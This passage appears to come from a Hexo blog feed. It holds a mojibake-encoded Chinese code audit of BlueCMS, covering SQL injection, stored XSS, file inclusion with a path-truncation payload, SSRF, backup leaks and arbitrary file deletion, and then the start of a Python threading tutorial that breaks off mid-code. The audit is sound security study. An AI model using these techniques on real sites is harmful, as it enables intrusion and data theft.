loading="lazy"></p><p>åªé™åˆ¶äº†ç®¡ç†å‘˜ç»„çš„ä¸èƒ½ä»å‰å°ç™»å½•ï¼Œå‚æ•°æ²¡ç»è¿‡ä»»ä½•çš„è¿‡æ»¤ã€‚ã€‚ã€‚</p><h4 id="æ³¨å†Œç•Œé¢SQLæ³¨å…¥"><a href="#æ³¨å†Œç•Œé¢SQLæ³¨å…¥" class="headerlink" title="æ³¨å†Œç•Œé¢SQLæ³¨å…¥"></a>æ³¨å†Œç•Œé¢SQLæ³¨å…¥</h4><p>æ—¢ç„¶æ˜¯æ³¨å†Œç•Œé¢å°±çœ‹è‚¯å®šæœ‰æ’å…¥æ•°æ®åˆ°æ•°æ®åº“ä¸­çš„æ“ä½œï¼Œç›´æ¥çœ‹æºç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt loading="lazy"></p><p>ç®€å•çš„è¿›è¡Œäº†ç”¨æˆ·å’Œå¯†ç çš„æ£€æµ‹ï¼Œä½†å¹¶èµ·ä¸åˆ°å®é™…çš„ä½œç”¨ï¼Œäºæ˜¯åœ¨emailå¤„å°è¯•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå•å¼•å·é—­åˆçš„æ—¶å€™èƒ½å¤ŸæˆåŠŸæ’å…¥åˆ°æ•°æ®åº“ä¸­å¹¶æ²¡æœ‰æŠ¥é”™ï¼Œäºæ˜¯æ¨æµ‹ä½¿ç”¨äº†é­”æœ¯æ–¹æ³•å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰ï¼Œè€Œsqlè¯­å¥ç¼–ç æ–¹æ³•ä½¿ç”¨çš„gbkç¼–ç ï¼Œäºæ˜¯åœ¨å•å¼•å·å‰é¢åŠ ä¸Š%dfæ„æˆå®½å­—èŠ‚æ³¨å…¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt loading="lazy"></p><p>æˆåŠŸæŠ¥é”™ä½†å¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºé”™è¯¯ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºä»£ç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt loading="lazy"></p><p>ä¼¼ä¹åªä¼šæŠ¥sqlè¯­æ³•é”™è¯¯ï¼Œè€Œæˆ‘ä»¬æŠ¥é”™æ³¨å…¥ä½¿ç”¨çš„æ˜¯XPATHä¸Šçš„è¯­æ³•é”™è¯¯ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œäºæ˜¯å°è¯•ç›²æ³¨è¯•è¯•ï¼Œå°è¯•åè§†ä¹å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œè€Œæ˜¯æŠ¥äº†é”™è¯¯ï¼ŒåŸå› ä¸æ˜ï¼Œåé¢å†ç ”ç©¶</p><p>å¦å¤–æ­¤å¤„è¿˜æœ‰ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´ï¼Œå¯ä»¥æ’å…¥å¤šè¡Œç”¨æˆ·æ•°æ®ï¼Œå¹¶ä¸”åœ¨emailå‡ºåµŒå…¥sqlè¯­å¥ï¼Œç”¨æˆ·åå•å¼•å·ç”¨åå…­è¿›åˆ¶ä»£æ›¿</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt loading="lazy"></p><p>å¯è§æˆåŠŸæ‰§è¡Œæ³¨å…¥ï¼Œåœ¨æ•°æ®åº“ä¸­æˆåŠŸæ‰§è¡Œäº†è¯­å¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt loading="lazy"></p><h4 id="ç®¡ç†ç™»å½•ç•Œé¢SQLæ³¨å…¥"><a href="#ç®¡ç†ç™»å½•ç•Œé¢SQLæ³¨å…¥" class="headerlink" title="ç®¡ç†ç™»å½•ç•Œé¢SQLæ³¨å…¥"></a>ç®¡ç†ç™»å½•ç•Œé¢SQLæ³¨å…¥</h4><p>å¦‚ä¸‹å›¾ï¼Œä¸‡èƒ½å¯†ç ç›´æ¥è¿›äº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt loading="lazy"></p><p>æºç ï¼Œæ— è¿‡æ»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt loading="lazy"></p><h4 id="ad-idSQLæ³¨å…¥"><a href="#ad-idSQLæ³¨å…¥" class="headerlink" title="ad_idSQLæ³¨å…¥"></a>ad_idSQLæ³¨å…¥</h4><p>ç›´æ¥çœ‹æºç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt loading="lazy"></p><p>åº”è¯¥å­˜åœ¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œéšååœ¨ç¬¬ä¸ƒä¸ªå­—æ®µæ‰¾åˆ°æ³¨å…¥ç‚¹ï¼ŒæˆåŠŸè·å–æ•°æ®åº“åï¼Œéšåå†æ¥ç€æŸ¥è¡¨åˆ—å°±è¡Œäº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt loading="lazy"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="ä¸ªäººèµ„æ–™å­˜å‚¨å‹xss"><a href="#ä¸ªäººèµ„æ–™å­˜å‚¨å‹xss" class="headerlink" title="ä¸ªäººèµ„æ–™å­˜å‚¨å‹xss"></a>ä¸ªäººèµ„æ–™å­˜å‚¨å‹xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt loading="lazy"></p><p>éšååœ¨ä¸ªäººç•Œé¢å’Œç®¡ç†å‘˜ç”¨æˆ·ç•Œé¢å®Œç¾å¼¹çª—ï¼Œå†çœ‹çœ‹æ•°æ®åº“ä¸­çš„èµ„æ–™</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt loading="lazy"></p><p>emailå’Œmsnéƒ½åµŒå…¥äº†scriptä»£ç ï¼Œä¸ºå•¥å…¶å®ƒçš„æ²¡ç”¨ï¼Ÿå› ä¸ºè¡¨å­—æ®µçš„é•¿åº¦åªæœ‰é‚£ä¹ˆé•¿</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt loading="lazy"></p><p>å†çœ‹çœ‹ä»£ç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt loading="lazy"></p><p>åŒæ ·æœªç»è¿‡è¿‡æ»¤ï¼Œè¿™é‡Œè¿˜å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œå°±ä¸å†™äº†ã€‚</p><h4 id="æ³¨å†Œç•Œé¢å­˜å‚¨å‹xss"><a href="#æ³¨å†Œç•Œé¢å­˜å‚¨å‹xss" class="headerlink" title="æ³¨å†Œç•Œé¢å­˜å‚¨å‹xss"></a>æ³¨å†Œç•Œé¢å­˜å‚¨å‹xss</h4><p>æ³¨å†Œç•Œé¢çš„éªŒè¯æœ‰éƒ¨åˆ†æ˜¯æ”¾åœ¨å‰ç«¯è¿›è¡ŒéªŒè¯çš„ï¼Œä¹Ÿå°±æ˜¯ç”¨jsè¿›è¡ŒéªŒè¯ï¼Œå¯æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå‰ç«¯éªŒè¯å¹¶ä¸å¯é ï¼ŒçœŸæ­£çš„éªŒè¯åº”è¯¥åšåœ¨åç«¯æ‰è¡Œï¼Œå°±æ¯”å¦‚è¿™é‡Œçš„é‚®ç®±éªŒè¯å°±æ”¾åœ¨å‰ç«¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt loading="lazy"></p><p>äºæ˜¯æˆ‘ä»¬ç›´æ¥æŠ“åŒ…ç»•è¿‡ï¼Œå¹¶åœ¨emailä¸­æ³¨å…¥æ¶æ„ä»£ç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt loading="lazy"></p><p>éšååªè¦å‰ç«¯èƒ½å¤Ÿçœ‹å¾—åˆ°è¯¥ç”¨æˆ·çš„é‚®ç®±ï¼Œå°±ä¼šæ‰§è¡Œè¯¥æ¶æ„ä»£ç ï¼Œå°±æ¯”å¦‚ç®¡ç†å‘˜çš„ç”¨æˆ·åˆ—è¡¨ç•Œé¢</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMSä»£ç å®¡è®¡/image-20200414101006315.png" style="zoom:80%;" loading="lazy"><h4 id="å‘å¸ƒæ–°é—»é¡µé¢å­˜å‚¨å‹XSS"><a href="#å‘å¸ƒæ–°é—»é¡µé¢å­˜å‚¨å‹XSS" class="headerlink" title="å‘å¸ƒæ–°é—»é¡µé¢å­˜å‚¨å‹XSS"></a>å‘å¸ƒæ–°é—»é¡µé¢å­˜å‚¨å‹XSS</h4><p>å…ˆçœ‹ä¸‹æºç ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt loading="lazy"></p><p>contentå‚æ•°ä½¿ç”¨çš„æ˜¯<code>filter_data</code>å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œè€Œè¿™ä¸ªå‡½æ•°å¹¶æ²¡æœ‰è¿‡æ»¤<code>img</code>æ ‡ç­¾ï¼Œäºæ˜¯å¯ä»¥åˆ©ç”¨è¿›è¡Œxssæ”»å‡»</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt loading="lazy"></p><p>éšååœ¨æ–°é—»é¡µé¢æˆåŠŸå¼¹çª—</p><h3 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h3><h4 id="å¤‡ä»½ä¿¡æ¯æ³„éœ²"><a href="#å¤‡ä»½ä¿¡æ¯æ³„éœ²" class="headerlink" title="å¤‡ä»½ä¿¡æ¯æ³„éœ²"></a>å¤‡ä»½ä¿¡æ¯æ³„éœ²</h4><p>ç®¡ç†å‘˜ç•Œé¢å¯ä»¥è¿›è¡Œæ•°æ®åº“å¤‡ä»½ï¼Œå¤‡ä»½å®Œåçš„æ•°æ®æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œå¹¶ä¸”å‘½åè§„åˆ™ä¸ºä½¿ç”¨å½“æ—¥æ—¥æœŸï¼Œå¯ä»¥å°è¯•çˆ†ç ´åœ°å€</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt loading="lazy"></p><p>è®¿é—®å³å¯ä¸‹è½½sqlæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œå¯†ç ç»è¿‡äº†md5åŠ å¯†ï¼Œå¼±å¯†ç çš„è¯ç›´æ¥å°±å¯ä»¥åŠ å¯†å¼€äº†</p><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>æ—¢ç„¶æœ‰æ–‡ä»¶åŒ…å«æ¼æ´è‡ªç„¶å°‘ä¸äº†é‚£å››ä¸ª<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">æ–‡ä»¶åŒ…å«</a>çš„æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰¾æ–‡ä»¶åŒ…å«æ¼æ´çš„æ—¶å€™å°±éœ€è¦å¯¹è¿™å‡ ä¸ªæ“ä½œæ ¼å¤–ç•™æ„</p><h4 id="æ”¯ä»˜è¡¨å•æ–‡ä»¶åŒ…å«"><a href="#æ”¯ä»˜è¡¨å•æ–‡ä»¶åŒ…å«" class="headerlink" title="æ”¯ä»˜è¡¨å•æ–‡ä»¶åŒ…å«"></a>æ”¯ä»˜è¡¨å•æ–‡ä»¶åŒ…å«</h4><p>å…ˆåœ¨user.phpä¸­æ‰¾åˆ°æœ‰<code>include</code>æ“ä½œçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥postä¸€ä¸ªpayå‚æ•°ï¼Œä¸”payå‚æ•°æˆ‘ä»¬å¯æ§ï¼Œæ—¢ç„¶æœ‰æ–‡ä»¶åŒ…å«äº†ï¼Œè‡ªç„¶å°±è¦æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹æ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶æ¥è¾¾åˆ°getshellçš„ç›®çš„ï¼Œåœ¨æˆ‘ä»¬ä¿®æ”¹ä¸ªäººèµ„æ–™çš„ç•Œé¢å°±æœ‰ä¸Šä¼ å¤´åƒçš„æ“ä½œï¼Œäºæ˜¯æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡é©¬</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt loading="lazy"></p><p>å¾—åˆ°è·¯å¾„ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶åŒ…å«æ“ä½œåœ¨åé¢è¿˜åŠ ä¸Šäº†ä¸€ä¸ª<code>/index.php</code>ï¼Œè¿™é‡Œå°±è¦æ ¹æ®ä¸ºWindowsä¸‹çš„æ–‡ä»¶æœ€å¤§è·¯å¾„æ¥æˆªå–äº†ï¼Œå‰ææ¡ä»¶æ˜¯phpç‰ˆæœ¬è¦å°äº<code>5.2.8</code>ï¼ŒWindowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼Œäºæ˜¯åœ¨æäº¤act=payçš„è¡¨å•å¤„æäº¤ä¸€ä¸ª<code>pay=../../data/upload/face_pic/15869440930.jpg......(è¶…å‡º256ä¸ªå­—èŠ‚)</code>ï¼Œå³å¯è¾¾åˆ°æ•ˆæœï¼Œç”±äºæˆ‘è¿™æ²¡é…php5.2.8çš„ç‰ˆæœ¬å°±ä¸æ¼”ç¤ºäº†</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="ä¿®æ”¹ç”¨æˆ·å¤´åƒå¤„SSRF"><a href="#ä¿®æ”¹ç”¨æˆ·å¤´åƒå¤„SSRF" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·å¤´åƒå¤„SSRF"></a>ä¿®æ”¹ç”¨æˆ·å¤´åƒå¤„SSRF</h4><p>æºç ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt loading="lazy"></p><p>è¿™æ®µä»£ç æ˜¯ç”¨æ¥é˜²æ­¢<code>http://</code>å’Œ<code>https://</code>é“¾æ¥çš„ï¼Œä½†æ˜¯ä½¿ç”¨çš„æ˜¯å¼±æ¯”ä»·ï¼Œå¦‚æœ<code>strpos</code>è¿”å›çš„å€¼ä¸º0ï¼Œé‚£ä¹ˆ<code>0!=false</code>è¿”å›çš„æ˜¯<code>false</code>å³å¯ç»•è¿‡åˆ¤æ–­è®¿é—®å†…ç½‘èµ„æº</p><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><h4 id="installæ— é™å®‰è£…"><a href="#installæ— é™å®‰è£…" class="headerlink" title="installæ— é™å®‰è£…"></a>installæ— é™å®‰è£…</h4><p>installç›®å½•æ˜¯ç”¨æ¥å®‰è£…è¿™ä¸ªCMSçš„ï¼Œä½†æ˜¯åœ¨ç»è¿‡ä¸€æ¬¡å®‰è£…åå†è¿›å…¥installç³»ç»Ÿå¹¶ä¸ä¼šæç¤ºå·²ç»å®‰è£…è¿‡æˆ–è€…è¦èº«ä»½éªŒè¯ï¼Œäºæ˜¯å°±ä¼šé€ æˆæ— éœ€ä»»ä½•æäº¤å°±å¯ä»¥é‡æ–°å®‰è£…è¿™ä¸ªç½‘ç«™çš„é£é™©ï¼Œå°½ç®¡ç®¡ç†å‘˜é¡µé¢æœ‰æç¤ºï¼ˆå¼€å‘äººå‘˜ä¹Ÿæœ‰æ„è¯†åˆ°ï¼‰ï¼Œä½†å¦‚æœä½¿ç”¨è€…å¹¶æ²¡æœ‰åœ¨æ„å°±ä¼šé€ æˆæå¤§çš„å±å®³</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt loading="lazy"></p><h4 id="çˆ†ç ´ç”¨æˆ·å"><a href="#çˆ†ç ´ç”¨æˆ·å" class="headerlink" title="çˆ†ç ´ç”¨æˆ·å"></a>çˆ†ç ´ç”¨æˆ·å</h4><p>åœ¨è¾“å…¥ç”¨æˆ·åä¹‹åç³»ç»Ÿä¼šè‡ªåŠ¨å‘ä¸€ä¸ªåŒ…åˆ°æ•°æ®åº“å»éªŒè¯ï¼Œå¦‚å›¾æ‰€ç¤º</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt loading="lazy"></p><p>è€Œè¿™ä¸ªæŸ¥è¯¢å¹¶æ²¡æœ‰æ¬¡æ•°é™åˆ¶ï¼Œäºæ˜¯å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ•°æ®åŒ…ä¼ å…¥çš„user_nameå€¼æ¥çˆ†ç ´ç”¨æˆ·åï¼Œé€ æˆèº«ä»½ä¿¡æ¯æ³„éœ²</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt loading="lazy"></p><h4 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h4><p>åœ¨ä¿®æ”¹ä¼šå‘˜çš„ä¸ªäººèµ„æ–™é¡µé¢å­˜åœ¨æ­¤æ¼æ´ï¼Œæºç ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt loading="lazy"></p><p><code>face_pic3</code>å¯æ§ï¼Œå½“<code>face_pic1</code>ä¸ºç©ºæ—¶å³å¯åˆ é™¤<code>face_pic3</code>æ–‡ä»¶ï¼Œå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt loading="lazy"></p><p>å¯åˆ é™¤ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„1.txtæ–‡ä»¶</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-å¤šçº¿ç¨‹ç¼–ç¨‹</title>
      <link href="posts/64be7bf2/"/>
      <url>posts/64be7bf2/</url>
      
        <content type="html"><![CDATA[<h3 id="threadingæ¨¡å—"><a href="#threadingæ¨¡å—" class="headerlink" title="threadingæ¨¡å—"></a>threadingæ¨¡å—</h3><p>å¯ç”¨å¯¹è±¡åˆ—è¡¨</p><table><thead><tr><th align="center">å¯¹è±¡</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">è¡¨ç¤ºä¸€ä¸ªæ‰§è¡Œçº¿ç¨‹çš„å¯¹è±¡</td></tr><tr><td align="center">Lock</td><td align="center">é”åŸè¯­å¯¹è±¡</td></tr><tr><td align="center">RLock</td><td align="center">å¯é‡å…¥é”å¯¹è±¡ï¼Œä½¿å•ä¸€çš„çº¿ç¨‹å¯ä»¥(å†æ¬¡)è·å¾—å·²æŒæœ‰çš„åš(é€’å½’é”)</td></tr><tr><td align="center">Condition</td><td align="center">æ¡ä»¶å˜é‡å¯¹è±¡ï¼Œä½¿å¾—ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ»¡è¶³çš„ç‰¹å®šçš„â€æ¡ä»¶â€ï¼Œæ¯”å¦‚æ”¹å˜çŠ¶æ€æˆ–æŸä¸ªæ•°æ®å€¼</td></tr><tr><td align="center">Event</td><td align="center">æ¡ä»¶å˜é‡çš„é€šç”¨ç‰ˆæœ¬ï¼Œä»»æ„æ•°é‡çš„çº¿ç¨‹ç­‰å¾…æŸä¸ªäº‹ä»¶çš„å‘ç”Ÿï¼Œåœ¨è¯¥äº‹ä»¶å‘ç”Ÿåæ‰€æœ‰çš„çº¿ç¨‹å°†è¢«æ¿€æ´»</td></tr><tr><td align="center">Semaphore</td><td align="center">ä¸ºçº¿ç¨‹é—´å…±äº«çš„æœ‰é™èµ„æºæä¾›äº†ä¸€ä¸ªâ€è®¡æ•°å™¨â€ï¼Œå¦‚æœæ²¡æœ‰å¯ç”¨èµ„æºæ—¶ä¼šè¢«é˜»å¡</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">ä¸Semaphoreç›¸ä¼¼ï¼Œä¸è¿‡å®ƒè¦åœ¨è¿è¡Œå‰ç­‰å¾…ä¸€æ®µæ—¶é—´</td></tr><tr><td align="center">Timer</td><td align="center">ä¸Threadç›¸ä¼¼ï¼Œä¸è¿‡å®ƒè¦åœ¨è¿è¡Œå‰ç­‰å¾…ä¸€æ®µæ—¶é—´</td></tr><tr><td align="center">Barrier</td><td align="center">åˆ›å»ºä¸€ä¸ªâ€éšœç¢â€ï¼Œå¿…é¡»è¾¾åˆ°æŒ‡å®šæ•°é‡çš„çº¿ç¨‹åæ‰å¯ä»¥ç»§ç»­</td></tr></tbody></table><h3 id="Threadç±»"><a href="#Threadç±»" class="headerlink" title="Threadç±»"></a>Threadç±»</h3><p>Threadç±»æ˜¯threadingæ¨¡å—ä¸»è¦çš„æ‰§è¡Œå¯¹è±¡</p><p><strong>Threadå¯¹è±¡æ•°æ®å±æ€§</strong></p><table><thead><tr><th align="center">å±æ€§</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">çº¿ç¨‹å</td></tr><tr><td align="center">ident</td><td align="center">çº¿ç¨‹çš„æ ‡è¯†ç¬¦</td></tr><tr><td align="center">daemon</td><td align="center">å¸ƒå°”æ ‡å¿—ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿ç¨‹æ˜¯å¦æ˜¯å®ˆæŠ¤çº¿ç¨‹</td></tr></tbody></table><p><strong>Threadå¯¹è±¡æ–¹æ³•</strong></p><table><thead><tr><th align="center">å±æ€§</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,verbose=None,daemon=None)</code></td><td align="center">å®ä¾‹åŒ–ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå¯è°ƒç”¨çš„targetï¼Œä»¥åŠå…¶å‚æ•°argsæˆ–kwargs</td></tr><tr><td align="center">start()</td><td align="center">å¼€å§‹æ‰§è¡Œè¯¥çº¿ç¨‹</td></tr><tr><td align="center">run()</td><td align="center">å®šä¹‰çº¿ç¨‹åŠŸèƒ½çš„æ–¹æ³•(é€šå¸¸åœ¨å­ç±»ä¸­è¢«åº”ç”¨å¼€å‘è€…é‡å†™)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">ç›´è‡³å¯åŠ¨çš„çº¿ç¨‹ç»ˆæ­¢ä¹‹å‰ä¸€ç›´æŒ‚èµ·ï¼›é™¤éç»™å‡ºäº†timeout(ç§’)ï¼Œå¦åˆ™ä¼šä¸€ç›´é˜»å¡</td></tr></tbody></table><p>ä¸‹é¢çœ‹ä¸€æ®µå¯åˆ›å»ºå¤šçº¿ç¨‹çš„ä»£ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token punctuation">,</span> ctimeloops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"done at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at:"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    nloops <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#target=éœ€è¦çº¿ç¨‹å»æ‰§è¡Œçš„æ–¹æ³•å   args=çº¿ç¨‹æ‰§è¡Œæ–¹æ³•æ¥æ”¶çš„å‚æ•°ï¼Œè¯¥å±æ€§æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ä¹Ÿéœ€è¦åœ¨æœ«å°¾åŠ é€—å·</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span 